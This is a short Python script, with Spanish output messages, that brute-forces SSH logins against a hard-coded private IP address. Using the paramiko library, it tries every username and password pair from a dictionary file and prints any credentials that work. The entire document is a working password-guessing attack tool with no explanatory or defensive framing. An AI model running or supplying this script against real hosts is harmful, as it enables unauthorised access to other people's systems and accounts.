

import paramiko
import time
def brute(ip, port, user, password):
	log = paramiko.util.log_to_file('log.log')
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		client.connect(ip, port=port, username=user,password=password)
		print('Credenciales:  Usuario: {} Password: {}'.format(user,password))
	except:
		print('Fallo en la autenticacion')


def ssh():
	ip = "192.168.0.141"
	port = 22

	users = open("pass_dict.txt",'r')
	users = users.read().split('\n')

	passwords = open("pass_dict.txt",'r')
	passwords = passwords.read().split('\n')

	for u in users:
		for p in passwords:
			brute(ip,port,u,p)
			time.sleep(3)


if __name__ == '__main__':
	ssh()